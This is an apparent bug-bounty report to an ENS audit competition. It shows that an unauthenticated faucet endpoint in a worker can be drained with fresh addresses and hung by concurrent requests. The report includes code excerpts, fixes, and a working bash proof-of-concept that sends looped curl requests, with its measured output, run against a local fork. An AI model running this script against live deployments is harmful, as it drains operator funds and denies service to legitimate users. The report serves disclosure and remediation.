# 89444 w a low any anonymous caller can drain the faucet hot wallet and hang worker invocations

**Submitted on Aug 19th 2026 at 11:33:24 UTC by @br0nz3p1ck4x3 for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #89444
* **Report Type:** Websites & Apps
* **Report severity:** Low
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/workers>
* **Impacts:**
  * Taking down the application/website

## Description

## Summary

`POST /wallet/fund` requires no authentication. For any address below the token threshold the worker signs a Sepolia transaction with `ETH_PRIVATE_KEY` and broadcasts it. One anonymous HTTP request costs the operator one on-chain transaction.

The endpoint has two anti-abuse controls and both are keyed on `address`, a value the caller puts in the request body. A fresh address on each request resets both. There is no per IP limit, no captcha, no global budget and no authentication anywhere on the path.

Concurrent requests then collide on the funder's nonce, and because the receipt wait has no timeout the losing requests never return.

Measured against a local Sepolia fork with the real worker: 50 anonymous requests produced 50 mined transactions; 20 concurrent requests produced 3 mined transactions and 16 requests that hung until the Workers runtime killed them; and once the funder was empty every request returned `{"error":"Internal server error"}` and stayed that way.

## Root cause

### 1. No authentication

`workers/api-worker/src/app/routes/wallet/index.ts:97`

```tsx
.post(
  '/fund',
  injectDb,
  vValidator('json', v.object({ address: ethAddress })),
  async (c) => {
    const { address } = c.req.valid('json')
```

No `requireAuth`, unlike every other state changing route in the worker. `address` is validated only as 40 hex characters (`src/utils/validation.ts:18`). `src/app/index.ts:15` mounts `cors()`, whose Hono default is `origin: "*"`, so any web page can also drive this from its visitors' browsers.

### 2. Both anti-abuse controls are keyed on the caller's own input

The balance gate, `:165`:

```tsx
const hasEnoughTokens =
  usdcBalance >= TOKENS.USDC.mintAmount / 10n &&
  daiBalance >= TOKENS.DAI.mintAmount / 10n
if (hasEnoughTokens) {
  // skip
} else {
  const multicallTxHash = await walletClient.writeContract({ ... aggregate3 mint ... })
  await walletClient.waitForTransactionReceipt({ hash: multicallTxHash })
}
```

A freshly generated address always has zero balances, so this branch always mints.

The KV lock, `:128` and `:259`, keyed `wallet:fund-lock:<address>` (`src/core/kv/index.ts:14`):

```tsx
const lockKey = KV_KEY.WALLET.FUND_LOCK(address)
if (await c.env.KV.get(lockKey)) {
  return c.json({ txHash: null })
}
await c.env.KV.put(lockKey, 'locked', { expirationTtl: 60 })
...
} finally {
  await c.env.KV.delete(lockKey)
}
```

Released in `finally`, so it does not outlive the request. It is a mutex, not a rate limit, and since the key is the recipient the caller chose it is never contended.

This is a bypass of a shipped control. The comment at `:121` states the lock's purpose: "Without this, concurrent `/wallet/fund` calls for the same address each read the same (low) balances and each mint + drip ETH, double-spending faucet funds and racing the funder's nonce." Keying it on attacker supplied input means neither half holds. Faucet funds are still double spent, and the funder's nonce is still raced, which step 4 of the PoC shows directly.

### 3. The receipt wait has no timeout

`:208` and `:246`:

```tsx
await walletClient.waitForTransactionReceipt({ hash: multicallTxHash })
await walletClient.waitForTransactionReceipt({ hash: dripTxHash })
```

viem polls indefinitely when no `timeout` is given. Concurrent requests all read the same pending nonce from `eth_getTransactionCount` and sign competing transactions; only one per nonce survives. The rest wait forever on a hash that will never be mined, pinning a worker invocation each until the runtime kills them.

## Impact

Each anonymous request burns funder ETH on a transaction that exists only because the attacker asked for it, measured at roughly 0.000105 ETH per request, with no v1 name required. With one v1 name the ETH drip additionally pays out 0.01 sepETH per call, and sweeping the address re-arms it (`hasV1Names` at `src/services/v1-names/index.ts:40` accepts any non expired, non reverse domain, including a subname).

Once the funder is empty the endpoint returns 500 for every caller. The code at `:37` records that the v1 to v2 migration flow is entirely wallet paid and that owners need "real sepETH, far more than the old one-shot approve drip", so that flow is unusable until an operator refills the wallet by hand. The endpoint does not recover on its own after the traffic stops.

Separately, 20 concurrent requests pin 16 worker invocations until the runtime terminates them. Legitimate callers in that window get the same hang.

## Recommendation

{% stepper %}
{% step %}

## Add caller-independent abuse controls

Add a control keyed on something the caller does not choose: per IP, plus a global daily budget for the funder wallet, persisted rather than released in `finally`. Authentication with `requireAuth` helps but is not sufficient alone, since accounts are free to create by signing with any wallet.
{% endstep %}

{% step %}

## Set receipt wait timeouts

Pass a `timeout` to both `waitForTransactionReceipt` calls so a dropped or replaced transaction cannot pin a worker invocation.
{% endstep %}

{% step %}

## Serialize funder sends

Serialize sends on the funder account rather than on the recipient, so concurrent requests cannot collide on one nonce.
{% endstep %}

{% step %}

## Check v1 names before minting

Move the `hasV1Names` check in front of the mint, not just in front of the ETH drip.
{% endstep %}

{% step %}

## Alert on funder depletion

Alert on funder depletion so this fails visibly instead of silently breaking migration.
{% endstep %}
{% endstepper %}

## Known issues

Not listed. The known issues document names one entry for `workers/api-worker`, R2-05, "SendGrid event webhook fails open when the verification key is unset". Different file (`src/app/routes/webhook/sendgrid.ts`), different root cause, and already fixed in this tree, where `:113` returns 500 when the key is unset instead of processing the body. No other entry in Part 1 or Part 2 touches `workers/`; those audits covered `apps/manager`, `apps/portal`, `packages/transaction-manager` and `packages/smart-account`.

## Proof of Concept

Runs against a local Anvil fork with the real worker. Nothing is broadcast to a public network.

{% stepper %}
{% step %}

## Start a pinned local fork

Any Sepolia RPC works as the state source:

```bash
anvil --fork-url <SEPOLIA_RPC> --fork-block-number 11515000 --port 8546 --no-rate-limit
```

{% endstep %}

{% step %}

## Point the worker at the fork

`ETH_PRIVATE_KEY` below is Anvil account #9, standing in for the deployed key:

```bash
cat > workers/api-worker/.dev.vars <<'VARS'
SEPOLIA_RPC_URL="<http://127.0.0.1:8546>"
ETH_PRIVATE_KEY="0x2a871d0798f97d79848a013d4936a73bf4cc922c825d33c1cf7073dff6d409c6"
DATABASE_URL="postgresql://postgres:postgres@127.0.0.1:5432/postgres"
JWT_SECRET="poc-local-only"
EMAIL_FROM_ADDRESS="noreply@example.invalid"
VARS
cd workers/api-worker && pnpm install && npx vite dev --port 2999
```

{% endstep %}

{% step %}

## Create `poc.sh`

```bash
#!/usr/bin/env bash
set -euo pipefail

R=http://127.0.0.1:8546
API=http://localhost:2999
F=0xa0Ee7A142d267C1f36714E4a8F75612F20a79720   # Anvil account #9
TMP=$(mktemp -d)

bal()   { cast balance "$F" --rpc-url "$R"; }
non()   { cast nonce   "$F" --rpc-url "$R"; }
fresh() { echo "0x$(openssl rand -hex 20)"; }
fund()  { curl -s -m 45 -X POST "$API/wallet/fund" -H 'Content-Type: application/json' \
            -d "{\"address\":\"$1\"}"; }
hr()    { printf '%s\n' "-----------------------------------------------------------"; }

cast rpc anvil_setBalance "$F" 0xB1A2BC2EC50000 --rpc-url "$R" >/dev/null   # 0.05 ETH

hr; echo "STEP 1  one anonymous request (no Authorization header)"
B0=$(bal); N0=$(non); A=$(fresh)
echo "  recipient $A"
echo "  response  $(fund "$A")"
echo "  funder nonce $N0 -> $(non), ETH spent $(( B0 - $(bal) )) wei"

hr; echo "STEP 2  control: the balance gate does work for a repeated address"
N0=$(non); A=$(fresh)
for i in 1 2 3; do echo "  call $i: $(fund "$A")"; done
echo "  funder nonce advanced by $(( $(non) - N0 ))"

hr; echo "STEP 3  bypass: 50 requests, a fresh address each time"
B0=$(bal); N0=$(non)
for _ in $(seq 1 50); do fund "$(fresh)" >/dev/null; done
echo "  funder nonce advanced by $(( $(non) - N0 ))"
echo "  ETH burned $(( B0 - $(bal) )) wei over 50 requests"

hr; echo "STEP 4  20 concurrent requests, distinct addresses"
cast rpc anvil_setBalance "$F" 0xB1A2BC2EC50000 --rpc-url "$R" >/dev/null
N0=$(non); mkdir -p "$TMP/c"
for i in $(seq 1 20); do ( fund "$(fresh)" > "$TMP/c/$i.json" 2>&1 ) & done
wait
echo "  funder nonce advanced by $(( $(non) - N0 )) out of 20 requests"
sort "$TMP/c"/*.json | sed 's/0x[0-9a-f]\{64\}/<txhash>/' | sort | uniq -c | sed 's/^/    /'

hr; echo "STEP 5  drain the funder, then watch the faucet die"
cast rpc anvil_setBalance "$F" 0x1C6BF52634000 --rpc-url "$R" >/dev/null   # 0.0005 ETH
for i in $(seq 1 8); do
  printf '  req %d: balance=%-20s resp=%s\n' "$i" "$(bal)" "$(fund "$(fresh)" | cut -c1-58)"
done
hr
```

{% endstep %}

{% step %}

## Review the output

```
-----------------------------------------------------------
STEP 1  one anonymous request (no Authorization header)
  recipient 0xc3fb2637606fdf7e068f812e9cebfcf796081951
  response  {"txHash":"0x0cc3513b06b9c6b6e0d8ce4917106d9a6f4ba4bb160403561ec5a2938e82c4ee"}
  funder nonce 30464 -> 30465, ETH spent 192165449843425 wei
-----------------------------------------------------------
STEP 2  control: the balance gate does work for a repeated address
  call 1: {"txHash":"0x6117aeb2bc138d89d5fb599bd8df5a037e7187d83926dce6c7250223726fde1b"}
  call 2: {"txHash":null}
  call 3: {"txHash":null}
  funder nonce advanced by 1
-----------------------------------------------------------
STEP 3  bypass: 50 requests, a fresh address each time
  funder nonce advanced by 50
  ETH burned 5246841348324524 wei over 50 requests
-----------------------------------------------------------
STEP 4  20 concurrent requests, distinct addresses
  funder nonce advanced by 3 out of 20 requests
       3 {"txHash":"<txhash>"}
       1 {"error":"Internal server error"}
      16 Error: The Workers runtime canceled this request because it detected that
         your Worker's code had hung and would never generate a response.
-----------------------------------------------------------
STEP 5  drain the funder, then watch the faucet die
  req 1: balance=500000000000000      resp={"txHash":"0xbb62c13eedce83396eae7b9d17ebec089e2b21e288a32
  req 2: balance=307834550156575      resp={"txHash":"0x8716fb5fa67e067fdc7354b7faa1b82962b6942e2d8e9
  req 3: balance=128107268105958      resp={"error":"Internal server error"}
  req 4: balance=128107268105958      resp={"error":"Internal server error"}
  req 5: balance=128107268105958      resp={"error":"Internal server error"}
  req 6: balance=128107268105958      resp={"error":"Internal server error"}
  req 7: balance=128107268105958      resp={"error":"Internal server error"}
  req 8: balance=128107268105958      resp={"error":"Internal server error"}
-----------------------------------------------------------
```

{% endstep %}
{% endstepper %}

Step 2 is a control: the balance gate is not broken in itself, three calls for one address cost one transaction and calls 2 and 3 correctly return `txHash: null`. Step 3 is the identical code path with a fresh address per request. In step 4 no response is `{"txHash":null}`, which is direct evidence that the KV lock never engaged for any of the 20.

Preconditions verified on the fork before running: Multicall3, the ensjs Sepolia mock USDC (`0x768F42455A2D082E23ceeF7d51e5787C82d67a39`) and mock DAI (`0x5472C5725A00B7bA11F0794A79D08ade6F4683bD`) all have code, and `mint(address,uint256)` succeeds from an arbitrary unfunded EOA.

An offline unit test reaching the same result with no network at all, driving the real route against a fake JSON-RPC node and recovering the sender from each signed transaction, is at `workers/api-worker/src/app/routes/wallet/fund-abuse.poc.test.ts` (`cd workers/api-worker && pnpm vitest run src/app/routes/wallet/fund-abuse.poc.test.ts`).
